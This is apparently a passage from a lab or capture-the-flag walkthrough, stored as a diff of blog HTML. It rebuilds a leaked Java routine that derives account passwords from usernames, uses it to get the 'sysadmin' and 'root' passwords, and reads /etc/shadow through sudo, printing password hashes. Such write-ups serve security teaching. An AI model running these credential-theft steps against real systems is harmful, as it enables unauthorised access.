+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">1</span>       <span class="cm">/*input is username of account*/</span>
+</span><span class='line'><span class="mi">2</span>       <span class="kt">int</span><span class="o">[]</span> <span class="nf">processLoop</span><span class="o">(</span><span class="n">String</span> <span class="n">input</span><span class="o">){</span>
+</span><span class='line'><span class="mi">3</span>         <span class="kt">int</span> <span class="n">strL</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
+</span><span class='line'><span class="mi">4</span>         <span class="kt">int</span> <span class="n">lChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">strL</span><span class="o">-</span><span class="mi">1</span><span class="o">);</span>
+</span><span class='line'><span class="mi">5</span>         <span class="kt">int</span> <span class="n">fChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+</span><span class='line'><span class="mi">6</span>         <span class="kt">int</span><span class="o">[]</span> <span class="n">encArr</span> <span class="o">=</span> <span class="kt">int</span><span class="o">[</span><span class="n">strL</span><span class="o">+</span><span class="mi">2</span><span class="o">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="mi">7</span>         <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strL</span><span class="o">+</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
+</span><span class='line'><span class="mi">8</span>           <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="o">);}</span>
+</span><span class='line'><span class="mi">9</span>           <span class="n">encArr</span><span class="o">[</span><span class="mi">0</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">lChar</span><span class="o">;</span>
+</span><span class='line'><span class="mi">10</span>          <span class="n">encArr</span><span class="o">[</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">fChar</span><span class="o">;</span>
+</span><span class='line'><span class="mi">11</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">backLoop</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
+</span><span class='line'><span class="mi">12</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">loopBack</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
+</span><span class='line'><span class="mi">13</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">loopProcesS</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="mi">14</span>          <span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="mi">15</span>          <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encArr</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
+</span><span class='line'><span class="mi">16</span>            <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">==</span><span class="n">j</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
+</span><span class='line'><span class="mi">17</span>              <span class="kt">int</span> <span class="n">t</span><span class="o">=</span><span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
+</span><span class='line'><span class="mi">18</span>              <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">];</span>
+</span><span class='line'><span class="mi">19</span>              <span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">]=</span><span class="n">t</span><span class="o">;</span><span class="n">j</span><span class="o">--;}</span>
+</span><span class='line'><span class="mi">20</span>      <span class="k">return</span> <span class="n">encArr</span><span class="o">;}</span>
+</span><span class='line'>
+</span><span class='line'><span class="mi">21</span>      <span class="cm">/*Note the pseudocode will be implemented with the </span>
+</span><span class='line'><span class="cm">22      root account and my account, we still need to implement it with the csadmin, sdadmin,   </span>
+</span><span class='line'><span class="cm">23      and dbadmin accounts though*/</span>
+</span><span class='line'>
+</span><span class='line'><span class="mi">24</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">backLoop</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
+</span><span class='line'><span class="mi">25</span>        <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
+</span><span class='line'><span class="mi">26</span>        <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="o">];</span>
+</span><span class='line'><span class="mi">27</span>        <span class="kt">int</span> <span class="n">ch</span><span class="o">=(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">)/</span><span class="mi">2</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="mi">28</span>        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ref</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
+</span><span class='line'><span class="mi">29</span>          <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]%</span><span class="n">check</span><span class="o">)+(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);</span>
+</span><span class='line'><span class="mi">30</span>          <span class="k">else</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);}</span>
+</span><span class='line'><span class="mi">31</span>      <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
+</span><span class='line'>
+</span><span class='line'><span class="mi">32</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopBack</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
+</span><span class='line'><span class="mi">33</span>        <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">/</span><span class="mi">2</span><span class="o">;</span>
+</span><span class='line'><span class="mi">34</span>        <span class="kt">int</span><span class="o">[]</span> <span class="n">encNew</span> <span class="o">=</span><span class="kt">int</span><span class="o">[</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">+</span><span class="n">ref</span><span class="o">];</span>
+</span><span class='line'><span class="mi">35</span>        <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="mi">36</span>        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="o">);</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+</span><span class='line'><span class="mi">37</span>          <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">input</span><span class="o">[</span><span class="n">ch</span><span class="o">];</span> <span class="n">ch</span><span class="o">++;}</span>
+</span><span class='line'><span class="mi">38</span>          <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encNew</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
+</span><span class='line'><span class="mi">39</span>            <span class="k">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&lt;=</span><span class="mi">33</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">33</span><span class="o">+(++</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
+</span><span class='line'><span class="mi">40</span>            <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&gt;=</span><span class="mi">126</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">126</span><span class="o">-(--</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
+</span><span class='line'><span class="mi">41</span>            <span class="k">else</span><span class="o">{</span>
+</span><span class='line'><span class="mi">42</span>              <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]-=(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="o">);</span>
+</span><span class='line'><span class="mi">43</span>              <span class="k">else</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]+=(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">);}}</span>
+</span><span class='line'><span class="mi">44</span>      <span class="k">return</span> <span class="n">encNew</span><span class="o">;}</span>
+</span><span class='line'>
+</span><span class='line'><span class="mi">45</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopProcess</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'><span class="mi">46</span>        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
+</span><span class='line'><span class="mi">47</span>          <span class="k">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">41</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
+</span><span class='line'><span class="mi">48</span>          <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">45</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="o">;}</span>
+</span><span class='line'><span class="mi">49</span>      <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After fixing minor issues, we compile the code in Java:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+</span><span class='line'>
+</span><span class='line'>     <span class="cm">/*input is username of account*/</span>
+</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">processLoop</span><span class="o">(</span><span class="n">String</span> <span class="n">input</span><span class="o">){</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">strL</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">lChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">strL</span><span class="o">-</span><span class="mi">1</span><span class="o">);</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">fChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+</span><span class='line'>       <span class="kt">int</span><span class="o">[]</span> <span class="n">encArr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">strL</span><span class="o">+</span><span class="mi">2</span><span class="o">];</span>
+</span><span class='line'>
+</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strL</span><span class="o">+</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
+</span><span class='line'>         <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="o">);}</span>
+</span><span class='line'>         <span class="n">encArr</span><span class="o">[</span><span class="mi">0</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">lChar</span><span class="o">;</span>
+</span><span class='line'>         <span class="n">encArr</span><span class="o">[</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">fChar</span><span class="o">;</span>
+</span><span class='line'>         <span class="n">encArr</span><span class="o">=</span><span class="n">backLoop</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
+</span><span class='line'>         <span class="n">encArr</span><span class="o">=</span><span class="n">loopBack</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
+</span><span class='line'>         <span class="n">encArr</span><span class="o">=</span><span class="n">loopProcess</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>         <span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>         <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
+</span><span class='line'>           <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">==</span><span class="n">j</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
+</span><span class='line'>             <span class="kt">int</span> <span class="n">t</span><span class="o">=</span><span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
+</span><span class='line'>             <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">];</span>
+</span><span class='line'>             <span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">]=</span><span class="n">t</span><span class="o">;</span><span class="n">j</span><span class="o">--;}</span>
+</span><span class='line'>     <span class="k">return</span> <span class="n">encArr</span><span class="o">;}</span>
+</span><span class='line'>
+</span><span class='line'>     <span class="cm">/*Note the pseudocode will be implemented with the </span>
+</span><span class='line'><span class="cm">     root account and my account, we still need to implement it with the csadmin, sdadmin,   </span>
+</span><span class='line'><span class="cm">     and dbadmin accounts though*/</span>
+</span><span class='line'>
+</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">backLoop</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="o">];</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">check</span><span class="o">=(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">)/</span><span class="mi">2</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ref</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
+</span><span class='line'>         <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]%</span><span class="n">check</span><span class="o">)+(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);</span>
+</span><span class='line'>         <span class="k">else</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);}</span>
+</span><span class='line'>     <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
+</span><span class='line'>
+</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopBack</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">/</span><span class="mi">2</span><span class="o">;</span>
+</span><span class='line'>       <span class="kt">int</span><span class="o">[]</span> <span class="n">encNew</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">+</span><span class="n">ref</span><span class="o">];</span>
+</span><span class='line'>       <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span>
+</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="o">);</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+</span><span class='line'>         <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">input</span><span class="o">[</span><span class="n">ch</span><span class="o">];</span> <span class="n">ch</span><span class="o">++;}</span>
+</span><span class='line'>         <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encNew</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
+</span><span class='line'>           <span class="k">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&lt;=</span><span class="mi">33</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">33</span><span class="o">+(++</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
+</span><span class='line'>           <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&gt;=</span><span class="mi">126</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">126</span><span class="o">-(--</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
+</span><span class='line'>           <span class="k">else</span><span class="o">{</span>
+</span><span class='line'>             <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]-=(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="o">);</span>
+</span><span class='line'>             <span class="k">else</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]+=(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">);}}</span>
+</span><span class='line'>     <span class="k">return</span> <span class="n">encNew</span><span class="o">;}</span>
+</span><span class='line'>
+</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopProcess</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
+</span><span class='line'>         <span class="k">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">41</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
+</span><span class='line'>         <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">45</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="o">;}</span>
+</span><span class='line'>     <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="kt">int</span><span class="o">[]</span> <span class="n">a</span> <span class="o">=</span> <span class="n">processLoop</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
+</span><span class='line'>        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">a</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span> <span class="n">a</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">root</span><span class="nd">@kali32</span><span class="o">:~</span><span class="err">#</span> <span class="n">javac</span> <span class="n">test</span><span class="o">.</span><span class="na">java</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We encrypt another usernames to get passwords.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# java test sysadmin
+</span><span class='line'>7531/{{tor/rv/A
+</span><span class='line'>root@kali32:~# java test root
+</span><span class='line'>31/Fwxw+2</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can log as sysadmin. Using sudo:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>User sysadmin may run the following commands on this host:
+</span><span class='line'>    (root) NOEXEC: /bin/ls
+</span><span class='line'>    (root) NOEXEC: /usr/bin/cat
+</span><span class='line'>    (root) NOEXEC: /usr/bin/more
+</span><span class='line'>    (root) NOEXEC: !/usr/bin/su *root*</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sysadmin@slax:~$ sudo cat /etc/shadow 
+</span><span class='line'>root:$1$vEElgVNe$9nK8G715PgmFE4g1QyTII0:13553:0:::::
+</span><span class='line'>bin:*:9797:0:::::
+</span><span class='line'>daemon:*:9797:0:::::
+</span><span class='line'>adm:*:9797:0:::::
+</span><span class='line'>lp:*:9797:0:::::
+</span><span class='line'>sync:*:9797:0:::::
